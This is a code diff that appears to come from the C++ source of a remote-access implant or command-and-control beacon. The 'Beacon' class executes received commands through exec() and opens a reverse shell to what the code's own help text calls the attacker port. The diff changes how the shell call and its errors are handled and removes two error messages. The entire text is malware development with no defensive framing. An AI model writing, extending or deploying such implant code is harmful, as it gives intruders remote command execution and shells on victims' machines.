@@ -65,7 +65,7 @@ void Beacon::await_update()
     while (true){
         char buf[1024];
         if (stop_accept == 1){
-            revshell(get_port());
+            int connect_err = revshell(get_port());
             stop_accept = 0;
             continue;
         }
@@ -108,21 +108,16 @@ std::string Beacon::respond(std::string buf){
 
     auto [result, op] = cmdline.accept(cmd);
     switch(result){
-        case 1:
-            cout = "invalid parameter(s) for " + op + ".\nrevshell <LPORT> : create reverse shell on attacker port <LPORT>";
-            status = 300;
-            break;
         case 99:
             stop_accept = 1;
-            break;
-        case 101:
-            cout = "unable to initiate reverse shell: port in use";
-            status = 300;
             break;
         case -1:
             cout = ::exec(cmd.c_str());
             break;
     }
+    if (stop_accept == 1){
+        return "";
+    } 
     ////////////////////////////////////////
     return set_update(status, cout, alive, persistent);
 }
